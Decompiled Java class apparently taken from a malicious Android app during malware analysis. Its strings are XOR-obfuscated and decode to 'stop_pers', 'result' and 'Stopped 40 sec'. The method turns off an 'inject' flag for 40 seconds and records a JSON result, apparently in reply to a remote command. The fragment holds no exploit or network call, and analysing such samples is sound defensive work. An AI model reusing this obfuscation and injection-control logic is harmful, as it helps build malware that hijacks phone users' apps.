package com.zjxyxnvvp.nxvxchltf.i;

import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.util.a;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class n {
    private static short[] $ = {736, 743, 764, 739, 716, 739, 758, 737, 736, 5500, 5483, 5501, 5499, 5474, 5498, 6201, 6174, 6149, 6170, 6170, 6159, 6158, 6218, 6238, 6234, 6218, 6169, 6159, 6153};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a() {
        d dVar = d.e;
        p pVar = dVar.c;
        String $2 = $(0, 9, 659);
        if (pVar.b($2) != null) {
            a.h = System.currentTimeMillis() + 40000;
            com.zjxyxnvvp.nxvxchltf.inject.a.f337a = false;
            JSONObject jSONObject = new JSONObject();
            try {
                jSONObject.put($(9, 15, 5390), $(15, 29, 6250));
            } catch (JSONException e) {
                e.printStackTrace();
            }
            dVar.c.e($2, jSONObject);
        }
    }
}
